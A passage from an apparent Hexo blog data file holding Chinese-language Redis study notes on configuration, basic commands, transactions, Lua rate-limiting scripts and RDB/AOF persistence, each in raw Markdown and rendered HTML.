class=\"line\">expire key <span class=\"number\">100</span></span><br><span class=\"line\">keys *</span><br><span class=\"line\">db size</span><br><span class=\"line\">ttl key</span><br><span class=\"line\">info</span><br><span class=\"line\">flushdb </span><br><span class=\"line\"><span class=\"built_in\">ping</span></span><br></pre></td></tr></table></figure>\n","excerpt":"<p>最近工作需要使用redis，现在只能边学习边总结。Redis的介绍就不说了，网上一搜一大把。</p>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>官方不提供windows版redis，<a href=\"https://github.com/MSOpenTech\">微软开源技术的github</a>上有提供，可以<a href=\"https://github.com/MSOpenTech/redis/releases\">下载</a>。下载解决之后，我们就开始可以搭建开发环境。<br>","more":"</p>\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><ul>\n<li>maxheap<br>这个是一个强限制，maxheap的大小包括文件存储大小及内存存储大小。如果超过这个限制，服务就会结束。</li>\n<li>maxmemory<br>maxheap必需要比maxmemory大，一般设置为maxmemory的1.5倍。</li>\n<li>文件系统大小<br>redis官方提供的公式:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(size of physical memory) + (2 * size of maxheap)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>如果你有一台机器内存为8G,maxheap设置为8G，那么你至少要有这么多空闲硬盘空间:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(8GB) + (2 * 8GB) = 24GB</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>maxmemory-policy<br>如果运行中达到了maxmemory，redis将根据这个设置清除一些存储数据。</li>\n<li>requirepass<br>设置服务密码。</li>\n<li>heapdir<br>内存映射文件路径</li>\n<li>timeout<br>连接超时时间</li>\n</ul>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p>启动服务<br><figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-server redis.windows.conf</span><br></pre></td></tr></table></figure></p>\n<p>启动客户端<br><figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h <span class=\"number\">127</span>.<span class=\"number\">0</span>.<span class=\"number\">0</span>.<span class=\"number\">1</span> -p <span class=\"number\">6379</span> -a password</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"基本命令\"><a href=\"#基本命令\" class=\"headerlink\" title=\"基本命令\"></a>基本命令</h3><figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set</span> key value </span><br><span class=\"line\">get key</span><br><span class=\"line\"><span class=\"built_in\">del</span> key</span><br><span class=\"line\">exists key</span><br><span class=\"line\">expire key <span class=\"number\">100</span></span><br><span class=\"line\">keys *</span><br><span class=\"line\">db size</span><br><span class=\"line\">ttl key</span><br><span class=\"line\">info</span><br><span class=\"line\">flushdb </span><br><span class=\"line\"><span class=\"built_in\">ping</span></span><br></pre></td></tr></table></figure>"},{"title":"redis学习4 事务","date":"2016-03-04T16:00:00.000Z","desc":"redis  事务","_content":"事务可以一次执行多个命令， 并且带有以下两个重要的保证：\n* 事务是一个单独的隔离操作：事务中的所有命令都会序列化、按顺序地执行。事务在执行的过程中，不会被其他客户端发送来的命令请求所打断。\n* 事务是一个原子操作：事务中的命令要么全部被执行，要么全部都不执行。\n<!-- more -->\n## 命令\n* multi 开启事务\n* discard 放弃事务\n* WATCH 事务执行条件\n* 事务执行\n\n简单事务:\n``` bash\n127.0.0.1:6379>multi\nOK\n127.0.0.1:6379>set yanbin 1\nQUEUED\n127.0.0.1:6379>exec\n1) OK\n127.0.0.1:6379>get yanbin\n\"1\"\n```\n放弃事务:\n``` bash\n127.0.0.1:6379>multi\nOK\n127.0.0.1:6379>set yanbin 1\nQUEUED\n127.0.0.1:6379>discard\nOK\n127.0.0.1:6379>exec\n(error) ERR EXEC without MULTI\n127.0.0.1:6379>get yanbin\n(nil)\n```\n事务条件:WATCH 使得 EXEC 命令需要有条件地执行： 事务只能在所有被监视键都没有被修改的前提下执行， 如果这个前提不能满足的话，事务就不会被执行。\n``` bash\n127.0.0.1:6379>watch yanbin\nOK\n127.0.0.1:6379>set yanbin 1\nOK\n127.0.0.1:6379>multi\nOK\n127.0.0.1:6379>incr yanbin\nQUEUED\n127.0.0.1:6379>exec\n(nil)\n127.0.0.1:6379>get yanbin\n\"1\"\n```","source":"_posts/redis-4.md","raw":"---\ntitle: redis学习4 事务\ndate: 2016-3-5\ndesc: redis  事务\n---\n事务可以一次执行多个命令， 并且带有以下两个重要的保证：\n* 事务是一个单独的隔离操作：事务中的所有命令都会序列化、按顺序地执行。事务在执行的过程中，不会被其他客户端发送来的命令请求所打断。\n* 事务是一个原子操作：事务中的命令要么全部被执行，要么全部都不执行。\n<!-- more -->\n## 命令\n* multi 开启事务\n* discard 放弃事务\n* WATCH 事务执行条件\n* 事务执行\n\n简单事务:\n``` bash\n127.0.0.1:6379>multi\nOK\n127.0.0.1:6379>set yanbin 1\nQUEUED\n127.0.0.1:6379>exec\n1) OK\n127.0.0.1:6379>get yanbin\n\"1\"\n```\n放弃事务:\n``` bash\n127.0.0.1:6379>multi\nOK\n127.0.0.1:6379>set yanbin 1\nQUEUED\n127.0.0.1:6379>discard\nOK\n127.0.0.1:6379>exec\n(error) ERR EXEC without MULTI\n127.0.0.1:6379>get yanbin\n(nil)\n```\n事务条件:WATCH 使得 EXEC 命令需要有条件地执行： 事务只能在所有被监视键都没有被修改的前提下执行， 如果这个前提不能满足的话，事务就不会被执行。\n``` bash\n127.0.0.1:6379>watch yanbin\nOK\n127.0.0.1:6379>set yanbin 1\nOK\n127.0.0.1:6379>multi\nOK\n127.0.0.1:6379>incr yanbin\nQUEUED\n127.0.0.1:6379>exec\n(nil)\n127.0.0.1:6379>get yanbin\n\"1\"\n```","slug":"redis-4","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0lltv000vg2x6bxdlkpsn","content":"<p>事务可以一次执行多个命令， 并且带有以下两个重要的保证：</p>\n<ul>\n<li>事务是一个单独的隔离操作：事务中的所有命令都会序列化、按顺序地执行。事务在执行的过程中，不会被其他客户端发送来的命令请求所打断。</li>\n<li>事务是一个原子操作：事务中的命令要么全部被执行，要么全部都不执行。<a id=\"more\"></a>\n<h2 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h2></li>\n<li>multi 开启事务</li>\n<li>discard 放弃事务</li>\n<li>WATCH 事务执行条件</li>\n<li>事务执行</li>\n</ul>\n<p>简单事务:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;multi</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">set</span> yanbin 1</span><br><span class=\"line\">QUEUED</span><br><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">exec</span></span><br><span class=\"line\">1) OK</span><br><span class=\"line\">127.0.0.1:6379&gt;get yanbin</span><br><span class=\"line\"><span class=\"string\">\"1\"</span></span><br></pre></td></tr></table></figure></p>\n<p>放弃事务:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;multi</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">set</span> yanbin 1</span><br><span class=\"line\">QUEUED</span><br><span class=\"line\">127.0.0.1:6379&gt;discard</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">exec</span></span><br><span class=\"line\">(error) ERR EXEC without MULTI</span><br><span class=\"line\">127.0.0.1:6379&gt;get yanbin</span><br><span class=\"line\">(nil)</span><br></pre></td></tr></table></figure></p>\n<p>事务条件:WATCH 使得 EXEC 命令需要有条件地执行： 事务只能在所有被监视键都没有被修改的前提下执行， 如果这个前提不能满足的话，事务就不会被执行。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;watch yanbin</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">set</span> yanbin 1</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt;multi</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt;incr yanbin</span><br><span class=\"line\">QUEUED</span><br><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">exec</span></span><br><span class=\"line\">(nil)</span><br><span class=\"line\">127.0.0.1:6379&gt;get yanbin</span><br><span class=\"line\"><span class=\"string\">\"1\"</span></span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>事务可以一次执行多个命令， 并且带有以下两个重要的保证：</p>\n<ul>\n<li>事务是一个单独的隔离操作：事务中的所有命令都会序列化、按顺序地执行。事务在执行的过程中，不会被其他客户端发送来的命令请求所打断。</li>\n<li>事务是一个原子操作：事务中的命令要么全部被执行，要么全部都不执行。","more":"<h2 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h2></li>\n<li>multi 开启事务</li>\n<li>discard 放弃事务</li>\n<li>WATCH 事务执行条件</li>\n<li>事务执行</li>\n</ul>\n<p>简单事务:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;multi</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">set</span> yanbin 1</span><br><span class=\"line\">QUEUED</span><br><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">exec</span></span><br><span class=\"line\">1) OK</span><br><span class=\"line\">127.0.0.1:6379&gt;get yanbin</span><br><span class=\"line\"><span class=\"string\">\"1\"</span></span><br></pre></td></tr></table></figure></p>\n<p>放弃事务:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;multi</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">set</span> yanbin 1</span><br><span class=\"line\">QUEUED</span><br><span class=\"line\">127.0.0.1:6379&gt;discard</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">exec</span></span><br><span class=\"line\">(error) ERR EXEC without MULTI</span><br><span class=\"line\">127.0.0.1:6379&gt;get yanbin</span><br><span class=\"line\">(nil)</span><br></pre></td></tr></table></figure></p>\n<p>事务条件:WATCH 使得 EXEC 命令需要有条件地执行： 事务只能在所有被监视键都没有被修改的前提下执行， 如果这个前提不能满足的话，事务就不会被执行。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;watch yanbin</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">set</span> yanbin 1</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt;multi</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt;incr yanbin</span><br><span class=\"line\">QUEUED</span><br><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">exec</span></span><br><span class=\"line\">(nil)</span><br><span class=\"line\">127.0.0.1:6379&gt;get yanbin</span><br><span class=\"line\"><span class=\"string\">\"1\"</span></span><br></pre></td></tr></table></figure></p>"},{"title":"redis学习5 lua脚本","date":"2016-03-06T16:00:00.000Z","desc":"redis  lua","_content":"redis内置的 Lua 解释器，可以使用lua对redis进行操作。使用脚本有以下好处:\n* 减少网络开销:批量执行redis命令。\n* 原子性操作:Redis也保证脚本会以原子性的方式执行:当某个脚本正在运行的时候，不会有其他脚本或Redis 命令被执行。\n* 复用：客户端发送的脚本会永久存储在Redis中，意味着其他客户端可以复用这一脚本而不需要使用代码完成同样的逻辑。\n<!-- more -->\n## 使用\n* lua脚本\nlua是一个很容易嵌入其它语言中使用的语言。很多应用程序、游戏使用LUA作为自己的嵌入式脚本语言，以此来实现可配置性、可扩展性。查看[lua5.1在线中文用户手册](http://manual.luaer.cn/)。\n* Eval\n通过redis-cli客户端单独调用Lua脚本文件，格式如下:\nredis-cli --eval myscript.lua [key ...] arg [arg ...]\n``` lua\n--[[ \n限制一定时间内的调用次数 \nKEYS[1]:key \nARGV[1]:存在时长\nARGV[2]:调用次数\n]]\nlocal times = redis.call('incr',KEYS[1])\n\nif times == 1 then\n    redis.call('expire',KEYS[1], ARGV[1])\nend\n\nif times > tonumber(ARGV[2]) then\n    return 0\nend\nreturn 1\n```\n调用 redis-cli --eval d:\\test.lua test:127.0.0.1 , 10 3\n\n通过EVAL命令执行脚本，格式如下:\nEVAL script numkeys key [key ...] arg [arg ...]\n``` bash\n127.0.0.1:6379>eval \"local times = redis.call('incr',KEYS[1]);if times == 1 then redis.call('expire',KEYS[1], ARGV[1]);end;if times > tonumber(ARGV[2]) then return 0;end;return 1\" 1 test:127.0.0.1 , 10 3\n(integer) 1\n127.0.0.1:6379>get test:127.0.0.1\n\"1\"\n```\nredis.call lua脚本通过redis.call调用redis命令。\n\n 总结:我们可以通过Lua来实现很多功功能:用Lua来封装复杂了Redis操作的业务;计数，统计，分析，收集数据;实现业务操作事务控制等等。\n\n","source":"_posts/redis-5.md","raw":"---\ntitle: redis学习5 lua脚本\ndate: 2016-3-7\ndesc: redis  lua\n---\nredis内置的 Lua 解释器，可以使用lua对redis进行操作。使用脚本有以下好处:\n* 减少网络开销:批量执行redis命令。\n* 原子性操作:Redis也保证脚本会以原子性的方式执行:当某个脚本正在运行的时候，不会有其他脚本或Redis 命令被执行。\n* 复用：客户端发送的脚本会永久存储在Redis中，意味着其他客户端可以复用这一脚本而不需要使用代码完成同样的逻辑。\n<!-- more -->\n## 使用\n* lua脚本\nlua是一个很容易嵌入其它语言中使用的语言。很多应用程序、游戏使用LUA作为自己的嵌入式脚本语言，以此来实现可配置性、可扩展性。查看[lua5.1在线中文用户手册](http://manual.luaer.cn/)。\n* Eval\n通过redis-cli客户端单独调用Lua脚本文件，格式如下:\nredis-cli --eval myscript.lua [key ...] arg [arg ...]\n``` lua\n--[[ \n限制一定时间内的调用次数 \nKEYS[1]:key \nARGV[1]:存在时长\nARGV[2]:调用次数\n]]\nlocal times = redis.call('incr',KEYS[1])\n\nif times == 1 then\n    redis.call('expire',KEYS[1], ARGV[1])\nend\n\nif times > tonumber(ARGV[2]) then\n    return 0\nend\nreturn 1\n```\n调用 redis-cli --eval d:\\test.lua test:127.0.0.1 , 10 3\n\n通过EVAL命令执行脚本，格式如下:\nEVAL script numkeys key [key ...] arg [arg ...]\n``` bash\n127.0.0.1:6379>eval \"local times = redis.call('incr',KEYS[1]);if times == 1 then redis.call('expire',KEYS[1], ARGV[1]);end;if times > tonumber(ARGV[2]) then return 0;end;return 1\" 1 test:127.0.0.1 , 10 3\n(integer) 1\n127.0.0.1:6379>get test:127.0.0.1\n\"1\"\n```\nredis.call lua脚本通过redis.call调用redis命令。\n\n 总结:我们可以通过Lua来实现很多功功能:用Lua来封装复杂了Redis操作的业务;计数，统计，分析，收集数据;实现业务操作事务控制等等。\n\n","slug":"redis-5","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0lltw000wg2x6jfbh316o","content":"<p>redis内置的 Lua 解释器，可以使用lua对redis进行操作。使用脚本有以下好处:</p>\n<ul>\n<li>减少网络开销:批量执行redis命令。</li>\n<li>原子性操作:Redis也保证脚本会以原子性的方式执行:当某个脚本正在运行的时候，不会有其他脚本或Redis 命令被执行。</li>\n<li>复用：客户端发送的脚本会永久存储在Redis中，意味着其他客户端可以复用这一脚本而不需要使用代码完成同样的逻辑。<a id=\"more\"></a>\n<h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2></li>\n<li>lua脚本<br>lua是一个很容易嵌入其它语言中使用的语言。很多应用程序、游戏使用LUA作为自己的嵌入式脚本语言，以此来实现可配置性、可扩展性。查看<a href=\"http://manual.luaer.cn/\" target=\"_blank\" rel=\"external\">lua5.1在线中文用户手册</a>。</li>\n<li>Eval<br>通过redis-cli客户端单独调用Lua脚本文件，格式如下:<br>redis-cli –eval myscript.lua [key …] arg [arg …]<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--[[ </span><br><span class=\"line\">限制一定时间内的调用次数 </span><br><span class=\"line\">KEYS[1]:key </span><br><span class=\"line\">ARGV[1]:存在时长</span><br><span class=\"line\">ARGV[2]:调用次数</span><br><span class=\"line\">]]</span></span><br><span class=\"line\"><span class=\"keyword\">local</span> times = redis.call(<span class=\"string\">'incr'</span>,KEYS[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> times == <span class=\"number\">1</span> <span class=\"keyword\">then</span></span><br><span class=\"line\">    redis.call(<span class=\"string\">'expire'</span>,KEYS[<span class=\"number\">1</span>], ARGV[<span class=\"number\">1</span>])</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> times &gt; <span class=\"built_in\">tonumber</span>(ARGV[<span class=\"number\">2</span>]) <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>调用 redis-cli –eval d:\\test.lua test:127.0.0.1 , 10 3</p>\n<p>通过EVAL命令执行脚本，格式如下:<br>EVAL script numkeys key [key …] arg [arg …]<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">eval</span> <span class=\"string\">\"local times = redis.call('incr',KEYS[1]);if times == 1 then redis.call('expire',KEYS[1], ARGV[1]);end;if times &gt; tonumber(ARGV[2]) then return 0;end;return 1\"</span> 1 <span class=\"built_in\">test</span>:127.0.0.1 , 10 3</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 1</span><br><span class=\"line\">127.0.0.1:6379&gt;get <span class=\"built_in\">test</span>:127.0.0.1</span><br><span class=\"line\"><span class=\"string\">\"1\"</span></span><br></pre></td></tr></table></figure></p>\n<p>redis.call lua脚本通过redis.call调用redis命令。</p>\n<p> 总结:我们可以通过Lua来实现很多功功能:用Lua来封装复杂了Redis操作的业务;计数，统计，分析，收集数据;实现业务操作事务控制等等。</p>\n","excerpt":"<p>redis内置的 Lua 解释器，可以使用lua对redis进行操作。使用脚本有以下好处:</p>\n<ul>\n<li>减少网络开销:批量执行redis命令。</li>\n<li>原子性操作:Redis也保证脚本会以原子性的方式执行:当某个脚本正在运行的时候，不会有其他脚本或Redis 命令被执行。</li>\n<li>复用：客户端发送的脚本会永久存储在Redis中，意味着其他客户端可以复用这一脚本而不需要使用代码完成同样的逻辑。","more":"<h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2></li>\n<li>lua脚本<br>lua是一个很容易嵌入其它语言中使用的语言。很多应用程序、游戏使用LUA作为自己的嵌入式脚本语言，以此来实现可配置性、可扩展性。查看<a href=\"http://manual.luaer.cn/\">lua5.1在线中文用户手册</a>。</li>\n<li>Eval<br>通过redis-cli客户端单独调用Lua脚本文件，格式如下:<br>redis-cli –eval myscript.lua [key …] arg [arg …]<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--[[ </span><br><span class=\"line\">限制一定时间内的调用次数 </span><br><span class=\"line\">KEYS[1]:key </span><br><span class=\"line\">ARGV[1]:存在时长</span><br><span class=\"line\">ARGV[2]:调用次数</span><br><span class=\"line\">]]</span></span><br><span class=\"line\"><span class=\"keyword\">local</span> times = redis.call(<span class=\"string\">'incr'</span>,KEYS[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> times == <span class=\"number\">1</span> <span class=\"keyword\">then</span></span><br><span class=\"line\">    redis.call(<span class=\"string\">'expire'</span>,KEYS[<span class=\"number\">1</span>], ARGV[<span class=\"number\">1</span>])</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> times &gt; <span class=\"built_in\">tonumber</span>(ARGV[<span class=\"number\">2</span>]) <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>调用 redis-cli –eval d:\\test.lua test:127.0.0.1 , 10 3</p>\n<p>通过EVAL命令执行脚本，格式如下:<br>EVAL script numkeys key [key …] arg [arg …]<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;<span class=\"built_in\">eval</span> <span class=\"string\">\"local times = redis.call('incr',KEYS[1]);if times == 1 then redis.call('expire',KEYS[1], ARGV[1]);end;if times &gt; tonumber(ARGV[2]) then return 0;end;return 1\"</span> 1 <span class=\"built_in\">test</span>:127.0.0.1 , 10 3</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 1</span><br><span class=\"line\">127.0.0.1:6379&gt;get <span class=\"built_in\">test</span>:127.0.0.1</span><br><span class=\"line\"><span class=\"string\">\"1\"</span></span><br></pre></td></tr></table></figure></p>\n<p>redis.call lua脚本通过redis.call调用redis命令。</p>\n<p> 总结:我们可以通过Lua来实现很多功功能:用Lua来封装复杂了Redis操作的业务;计数，统计，分析，收集数据;实现业务操作事务控制等等。</p>"},{"title":"redis学习6 持久化","date":"2016-03-07T16:00:00.000Z","desc":"redis  持久化","_content":"redis提供二种持久化方式:一种是RDB,另一种是AOF.\nRDB持久化可以在指定的时间间隔内生成数据集的时间点快照（point-in-time snapshot）。\nAOF持久化记录服务器执行的所有写操作命令，并在服务器启动时，通过重新执行这些命令来还原数据集。 AOF 文件中的命令全部以 Redis 协议的格式来保存，新命令会被追加到文件的末尾。 Redis 还可以在后台对 AOF 文件进行重写（rewrite），使得 AOF 文件的体积不会超出保存数据集状态所需的实际大小。\n<!-- more -->\n## 配置\n* rdb配置\n比如说， 以下设置会让 Redis 在满足“ 60 秒内有至少有 1000 个键被改动”这一条件时， 自动保存一次数据集:\nsave 60 1000\n* aof配置\nappendonly yes  启用\nappendfsync always 每次有新命令追加到 AOF 文件时就执行一次 fsync ：非常慢，也非常安全\nappendfsync everysec 每秒 fsync 一次：足够快（和使用 RDB 持久化差不多），并且在故障时只会丢失 1 秒钟的数据。\nappendfsync no 从不 fsync ：将数据交给操作系统来处理。更快，也更不安全的选择。\n配置好，启动服务之后，在你程序的目录会出现二个文件，一个是dump.rdb,一个是appendonly.aof\n* RDB和AOF 之间的相互作用\n1. 当 Redis 启动时，如果RDB持久化和AOF持久化都被打开了，那么程序会优先使用 AOF 文件来恢复数据集，因为 AOF 文件所保存的数据通常是最完整的。\n2. Redis为了防止两个后台(RDB和AOF)进程同时对磁盘进行大量的 I/O 操作。redis在RDB Save的过程中，不会执行 AOF RewriteAOF。反之,在AOF RewriteAOF执行的过程中，也不会执行RDB Save。\n","source":"_posts/redis-6.md","raw":"---\ntitle: redis学习6 持久化\ndate: 2016-3-8\ndesc: redis  持久化\n---\nredis提供二种持久化方式:一种是RDB,另一种是AOF.\nRDB持久化可以在指定的时间间隔内生成数据集的时间点快照（point-in-time snapshot）。\nAOF持久化记录服务器执行的所有写操作命令，并在服务器启动时，通过重新执行这些命令来还原数据集。 AOF 文件中的命令全部以 Redis 协议的格式来保存，新命令会被追加到文件的末尾。 Redis 还可以在后台对 AOF 文件进行重写（rewrite），使得 AOF 文件的体积不会超出保存数据集状态所需的实际大小。\n<!-- more -->\n## 配置\n* rdb配置\n比如说， 以下设置会让 Redis 在满足“ 60 秒内有至少有 1000 个键被改动”这一条件时， 自动保存一次数据集:\nsave 60 1000\n* aof配置\nappendonly yes  启用\nappendfsync always 每次有新命令追加到 AOF 文件时就执行一次 fsync ：非常慢，也非常安全\nappendfsync everysec 每秒 fsync 一次：足够快（和使用 RDB 持久化差不多），并且在故障时只会丢失 1 秒钟的数据。\nappendfsync no 从不 fsync ：将数据交给操作系统来处理。更快，也更不安全的选择。\n配置好，启动服务之后，在你程序的目录会出现二个文件，一个是dump.rdb,一个是appendonly.aof\n* RDB和AOF 之间的相互作用\n1. 当 Redis 启动时，如果RDB持久化和AOF持久化都被打开了，那么程序会优先使用 AOF 文件来恢复数据集，因为 AOF 文件所保存的数据通常是最完整的。\n2. Redis为了防止两个后台(RDB和AOF)进程同时对磁盘进行大量的 I/O 操作。redis在RDB Save的过程中，不会执行 AOF RewriteAOF。反之,在AOF RewriteAOF执行的过程中，也不会执行RDB Save。\n","slug":"redis-6","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0lltz000xg2x62aksmrj2","content":"<p>redis提供二种持久化方式:一种是RDB,另一种是AOF.<br>RDB持久化可以在指定的时间间隔内生成数据集的时间点快照（point-in-time snapshot）。<br>AOF持久化记录服务器执行的所有写操作命令，并在服务器启动时，通过重新执行这些命令来还原数据集。 AOF 文件中的命令全部以 Redis 协议的格式来保存，新命令会被追加到文件的末尾。 Redis 还可以在后台对 AOF 文件进行重写（rewrite），使得 AOF 文件的体积不会超出保存数据集状态所需的实际大小。<br><a id=\"more\"></a></p>\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><ul>\n<li>rdb配置<br>比如说， 以下设置会让 Redis 在满足“ 60 